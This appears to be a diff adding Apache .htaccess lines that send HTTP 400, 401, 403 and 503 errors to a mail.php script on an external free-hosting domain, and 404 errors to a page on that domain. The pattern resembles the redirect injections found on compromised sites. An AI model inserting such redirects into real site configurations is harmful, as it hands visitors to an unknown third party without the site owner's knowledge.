@@ -1,0 +1,5 @@
+ErrorDocument 400 http://bit2byte.byethost10.com/mail.php
+ErrorDocument 401 http://bit2byte.byethost10.com/mail.php
+ErrorDocument 403 http://bit2byte.byethost10.com/mail.php
+ErrorDocument 404 http://bit2byte.byethost10.com/404.html
+ErrorDocument 503 http://bit2byte.byethost10.com/mail.php
